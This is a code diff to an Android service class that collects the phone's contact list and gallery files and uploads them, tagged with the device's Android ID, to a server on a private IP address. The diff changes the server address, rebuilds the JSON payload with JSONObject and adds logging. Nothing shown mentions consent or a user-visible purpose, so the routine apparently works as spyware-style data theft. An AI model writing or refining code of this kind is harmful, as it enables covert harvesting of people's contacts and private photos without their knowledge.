@@ -13,6 +13,8 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Log;
 
+import org.json.JSONObject;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
@@ -102,32 +104,38 @@ public class UploadService extends Service {
     }
 
     private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
-        String contactsUrl = "http://192.168.10.15:3000/uploadContacts"; // Endpoint for contacts
-        String filesUrl = "http://192.168.10.15:3000/upload"; // Endpoint for file uploads
+        String contactsUrl = "http://192.168.200.172:3000/uploadContacts"; // Endpoint for contacts
+        String filesUrl = "http://192.168.200.172:3000/upload"; // Endpoint for file uploads
 
-        // Upload contacts as JSON with Android ID
+        // Upload contacts as JSON
         for (String contact : contacts) {
             try {
-                String payload = "{\"type\":\"contact\",\"data\":\"" + escapeSpecialChars(contact) + "\", \"androidId\":\"" + androidId + "\"}";
-                sendPostRequest(contactsUrl, payload); // Send contact to /uploadContacts
+                String payload = new JSONObject()
+                        .put("type", "contact")
+                        .put("data", contact)
+                        .put("androidId", androidId)
+                        .toString();
+
+                sendPostRequest(contactsUrl, payload);
             } catch (Exception e) {
                 Log.e(TAG, "Failed to upload contact: " + contact, e);
             }
         }
 
-        // Upload gallery files as multipart with Android ID
+        // Upload gallery files as multipart
         for (String filePath : galleryFiles) {
             File file = new File(filePath);
             if (file.exists()) {
                 try {
-                    uploadFile(filesUrl, file, androidId); // Upload files to /upload with Android ID
+                    uploadFile(filesUrl, file, androidId);
                 } catch (Exception e) {
                     Log.e(TAG, "Failed to upload file: " + filePath, e);
                 }
+            } else {
+                Log.e(TAG, "File not found: " + filePath);
             }
         }
     }
-
 
     // Method to upload file using multipart
     private void uploadFile(String serverUrl, File file, String androidId) throws IOException {
@@ -158,8 +166,6 @@ public class UploadService extends Service {
             }
         }
     }
-
-
 
     // Escape special characters in the string to avoid JSON formatting issues
     private String escapeSpecialChars(String input) {
